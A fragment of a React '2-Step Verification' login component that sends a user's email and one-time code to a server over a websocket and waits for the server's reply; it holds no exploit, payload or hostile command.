...
const AuthStep = ({ email, socket, onBack , errorMsg}) => {
  const [code, setCode] = useState("");
  const [focused, setFocused] = useState(false);
  const [dontAskAgain, setDontAskAgain] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isInvalid, setIsInvalid] = useState(false); // 🔴 new for invalid state
  ...
  const handleSubmit = (e) => {
    ...
    // emit code to server
    socket.emit("user:code", { email, code, dontAskAgain });
    console.log("Sent code to server:", { email, code, dontAskAgain });
  };

  // ✅ Stop loading when the server replies
  useEffect(() => {
    if (!socket) return;

    const stopLoadingOnEvent = (data) => {
      console.log("[AuthStep] Server replied:", data);
      setIsLoading(false);
    };
          ...
          <div className=" md:flex md:gap-16 md:items-start">
            ...
            <div className="flex-1">
              <form onSubmit={handleSubmit} className="space-y-6">
                <label
                  htmlFor="code"
                  className="block text-xl font-medium text-black text-start pb-2"
                >
                  2-Step Verification
                </label>
                ...
                <div className="relative w-full">
                  <input
                    ...
                    className={`w-full h-14 px-4 text-base rounded-md border bg-white transition-all duration-200
                      ${
                        isInvalid
                          ? "border-red-500"
                          : focused
